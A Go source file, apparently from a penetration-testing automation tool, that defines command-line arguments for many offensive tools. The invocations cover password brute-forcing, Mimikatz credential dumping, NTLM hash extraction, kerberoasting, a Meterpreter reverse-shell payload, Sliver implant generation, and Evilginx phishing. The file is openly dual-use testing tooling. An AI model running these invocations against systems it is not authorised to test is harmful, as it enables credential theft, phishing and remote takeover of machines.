package capability

import (
	"strings"

	"github.com/s41r4j/cybot/pkg/schema"
)

const (
	seclistsUsernames    = "/opt/cybot/share/seclists/Usernames/top-usernames-shortlist.txt"
	seclistsPasswords10k = "/opt/cybot/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
	seclistsCommon       = "/opt/cybot/share/seclists/Discovery/Web-Content/common.txt"
)

func hydraArgs(target string, _ schema.RunRequest) []string {
	args := []string{"-L", seclistsUsernames, "-P", seclistsPasswords10k, "-o", "/dev/stdout", "-f"}
	return append(args, strings.TrimSpace(target))
}

func hashcatArgs(target string, _ schema.RunRequest) []string {
	return []string{"-m", "0", "-a", "0", "--status", "--status-timer", "1", "--outfile", "/dev/stdout", "--outfile-format", "2", "--potfile-disable", strings.TrimSpace(target), seclistsPasswords10k}
}

func johnArgs(target string, _ schema.RunRequest) []string {
	return []string{"--wordlist=" + seclistsPasswords10k, "--format=raw-md5", strings.TrimSpace(target)}
}

func theharvesterArgs(target string, _ schema.RunRequest) []string {
	return []string{"-d", strings.TrimSpace(target), "-b", "all", "-f", "/dev/stdout"}
}

func sherlockArgs(target string, _ schema.RunRequest) []string {
	return []string{"--print-found", "--timeout", "10", strings.TrimSpace(target)}
}

func metagoofilArgs(target string, _ schema.RunRequest) []string {
	return []string{"-d", strings.TrimSpace(target), "-t", "pdf,doc,xls,ppt,docx,xlsx,pptx", "-n", "20", "-o", "/tmp/metagoofil"}
}

func impacketArgs(target string, _ schema.RunRequest) []string {
	return []string{"-just-dc-ntlm", strings.TrimSpace(target)}
}

func netexecArgs(target string, _ schema.RunRequest) []string {
	return []string{"smb", strings.TrimSpace(target)}
}

func bloodhoundArgs(target string, _ schema.RunRequest) []string {
	return []string{"--collectionmethods", "All", "--dns-timeout", "5", "--json-folder", "/tmp/bloodhound", strings.TrimSpace(target)}
}

func msfvenomArgs(target string, _ schema.RunRequest) []string {
	return []string{"-p", "linux/x64/meterpreter/reverse_tcp", "LHOST=" + strings.TrimSpace(target), "LPORT=4444", "-f", "raw", "-o", "/dev/stdout"}
}

func gophishArgs(target string, _ schema.RunRequest) []string {
	return []string{"--config", "/opt/cybot/etc/gophish/config.json", "--no-colors"}
}

func evilginxArgs(target string, _ schema.RunRequest) []string {
	return []string{"-p", "/opt/cybot/share/evilginx/phishlets", "-i", strings.TrimSpace(target)}
}

func bettercapArgs(target string, _ schema.RunRequest) []string {
	return []string{"-iface", scopedResource(target), "-eval", "net.probe on; net.show"}
}

func pcredzArgs(target string, _ schema.RunRequest) []string {
	return []string{"--json", "--out", "/dev/stdout", strings.TrimSpace(target)}
}

func dnschefArgs(target string, _ schema.RunRequest) []string {
	return []string{"--fakeip", "127.0.0.1", "--interface", "0.0.0.0", "--port", "53", "--logfile", "/dev/stdout", "--tcp"}
}

func sliverArgs(target string, _ schema.RunRequest) []string {
	return []string{"generate", "--mtls", strings.TrimSpace(target) + ":8888", "--os", "linux", "--arch", "amd64", "--format", "raw"}
}

func havocArgs(target string, _ schema.RunRequest) []string {
	return []string{"--bind-address", strings.TrimSpace(target), "--profile", "/opt/cybot/etc/havoc/default.yaotl"}
}

func merlinArgs(target string, _ schema.RunRequest) []string {
	return []string{"-l", strings.TrimSpace(target) + ":443", "-r", "0.0.0.0:443"}
}

func mythicArgs(target string, _ schema.RunRequest) []string {
	return []string{"status", strings.TrimSpace(target)}
}

func covenantArgs(target string, _ schema.RunRequest) []string {
	return []string{"--help"}
}

func mimikatzArgs(target string, _ schema.RunRequest) []string {
	return []string{"privilege::debug", "sekurlsa::logonpasswords", "exit"}
}

func certipyArgs(target string, _ schema.RunRequest) []string {
	return []string{"find", "-dc-ip", strings.TrimSpace(target), "-vulnerable"}
}

func rubeusArgs(target string, _ schema.RunRequest) []string {
	return []string{"kerberoast", "/domain:" + strings.TrimSpace(target), "/outfile:-"}
}

func linpeasArgs(target string, _ schema.RunRequest) []string {
	return []string{"-q", "-a", "-s"}
}

func winpeasArgs(target string, _ schema.RunRequest) []string {
	return []string{"-wait", "1"}
}

func seatbeltArgs(target string, _ schema.RunRequest) []string {
	return []string{"-group=all", "-full"}
}

func sharpviewArgs(target string, _ schema.RunRequest) []string {
	return []string{"-group=all", "-domain", strings.TrimSpace(target)}
}

func sharphoundArgs(target string, _ schema.RunRequest) []string {
	return []string{"-c", "All", "-d", strings.TrimSpace(target), "--outputdirectory", "/tmp/sharphound"}
}

func sharpupArgs(target string, _ schema.RunRequest) []string {
	return []string{"audit"}
}

func sharppersistArgs(target string, _ schema.RunRequest) []string {
	return []string{"-t", "check"}
}

func kekeoArgs(target string, _ schema.RunRequest) []string {
	return []string{"exit"}
}

func metasploitArgs(target string, _ schema.RunRequest) []string {
	return []string{"-q", "-x", "help; exit"}
}

func powersploitArgs(target string, _ schema.RunRequest) []string {
	return []string{"-Command", "Get-Module -ListAvailable"}
}

func chiselArgs(target string, _ schema.RunRequest) []string {
	return []string{"server", "--reverse", "--port", "8000"}
}

func crackmapexecArgs(target string, _ schema.RunRequest) []string {
	return []string{"smb", strings.TrimSpace(target)}
}

func responderArgs(target string, _ schema.RunRequest) []string {
	return []string{"-I", scopedResource(target), "-wv"}
}

func shodanArgs(target string, _ schema.RunRequest) []string {
	return []string{"search", "--fields", "ip_str,port,org", strings.TrimSpace(target)}
}

func swaksArgs(target string, _ schema.RunRequest) []string {
	return []string{"--to", strings.TrimSpace(target), "--from", "cybot@example.com", "--server", "127.0.0.1"}
}

func knockpyArgs(target string, _ schema.RunRequest) []string {
	return []string{"--json", "--subdomain", strings.TrimSpace(target)}
}

func gfArgs(target string, _ schema.RunRequest) []string {
	return []string{"cybot-urls", target}
}

func anewArgs(string, schema.RunRequest) []string { return []string{"-d"} }

func waybackurlsArgs(target string, _ schema.RunRequest) []string {
	return []string{strings.TrimSpace(target)}
}

func searchsploitArgs(target string, _ schema.RunRequest) []string {
	return []string{"--no-color", strings.TrimSpace(target)}
}

func enum4linuxArgs(target string, _ schema.RunRequest) []string {
	return []string{"-a", strings.TrimSpace(target)}
}

func wpscanArgs(target string, _ schema.RunRequest) []string {
	return []string{"--url", strings.TrimSpace(target), "--format", "json", "--no-update", "--random-user-agent"}
}

func dnsreconArgs(target string, _ schema.RunRequest) []string {
	return []string{"-d", strings.TrimSpace(target), "-t", "std,brt"}
}

func smbmapArgs(target string, _ schema.RunRequest) []string {
	return []string{"-H", strings.TrimSpace(target), "--no-banner"}
}

func cloudfoxArgs(target string, _ schema.RunRequest) []string {
	return []string{"aws", "--output", "text", strings.TrimSpace(target)}
}

func pacuArgs(target string, _ schema.RunRequest) []string {
	return []string{"--module", "aws__enum", "--set-session", "cybot", strings.TrimSpace(target)}
}

func arjunArgs(target string, _ schema.RunRequest) []string {
	return []string{"-u", strings.TrimSpace(target), "--get", "--quiet"}
}
